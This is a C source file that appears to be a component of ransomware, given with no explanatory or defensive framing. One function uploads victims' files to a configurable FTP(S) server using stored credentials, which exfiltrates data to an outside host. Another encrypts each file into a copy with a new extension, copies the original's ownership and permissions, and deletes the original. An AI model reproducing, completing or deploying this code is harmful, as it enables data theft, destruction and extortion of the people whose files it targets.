#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/enc.h"
#include "../lib/log.h"
#include "../lib/util.h"

char *FTP_URL = NULL;
char *FTP_USER = NULL;
char *FTP_PWD = NULL;
char *EXT = NULL;

void upload_file(void *arg) {
  char *file = (char *)arg;
  FILE *fp = fopen(file, "r");
  if (NULL == fp) {
    free(file);
    return;
  }

  CURL *curl = curl_easy_init();
  if (NULL == curl) {
    free(file);
    fclose(fp);
    return;
  }

  char url[strlen(FTP_URL) + strlen(file) + 3];
  join(url, FTP_URL, file);
  replace(url, ' ', '_');

  char userpwd[strlen(FTP_USER) + strlen(FTP_PWD) + 2];
  sprintf(userpwd, "%s:%s", FTP_USER, FTP_PWD);

  debug("Uploading to FTP(S): %s", url);
  curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
  curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);
  curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS,
                   (long)CURLFTP_CREATE_DIR_RETRY);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_READDATA, fp);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK)
    error("Failed to upload %s: %s", file, curl_easy_strerror(res));

  curl_easy_cleanup(curl);
  free(file);
  fclose(fp);
}

void encrypt_file(void *arg) {
  char *file = (char *)arg;
  char new_file[strlen(file) + strlen(EXT) + 2];
  sprintf(new_file, "%s.%s", file, EXT);

  if(access(new_file, F_OK)==0)
    return;

  FILE *src = fopen(file, "r+b");
  FILE *dst = fopen(new_file, "w+b");

  if (NULL == src || NULL == dst){
    error("Failed to open %s", file);
    goto FREE;
  }

  unsigned char output[64] = {0};
  unsigned char input[64] = {0};
  int readsz = 0;

  while (true) {
    readsz = fread(input, 1, 64, src);
    if(readsz <= 0)
      goto FREE;

    if (encrypt(input, readsz, output) <= 0) {
      error("Failed to encrypt %s", file);
      goto FREE;
    }

    fwrite(output, 1, readsz, dst);
    if (readsz < 64)
      break;
  }

  struct stat st;
  fstat(fileno(src), &st);
  fchown(fileno(dst), st.st_uid, st.st_gid);
  fchmod(fileno(dst), st.st_mode);
  unlink(file);

FREE:
  fclose(dst);
  fclose(src);
  free(file);
}
